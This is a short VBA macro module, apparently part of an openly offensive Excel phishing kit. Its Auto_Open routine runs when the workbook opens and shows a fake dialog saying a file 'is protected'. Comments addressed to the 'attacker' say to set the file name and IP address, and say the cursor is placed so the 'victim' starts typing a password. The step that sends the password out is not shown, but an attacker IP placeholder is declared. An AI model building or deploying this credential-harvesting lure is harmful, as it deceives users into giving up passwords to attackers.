Attribute VB_Name = "AutoOpen"
Public FileName, FilePath, IPAddr As String

Sub Auto_Open()
  
    ' TODO by attacker - Change variable values
    FilePath = "Documentation"
    FileName = "CHANGEME.xlsx"
    IPAddr = "127.0.0.1"
    
    PasswordForm.FileNameLabel.Caption = "'" + FileName + "' is protected."

    PasswordForm.Show
    ' UX - Put cursor in textbox so victim can start typing as per normal functionality
    PasswordForm.PasswordBox.SetFocus
End Sub



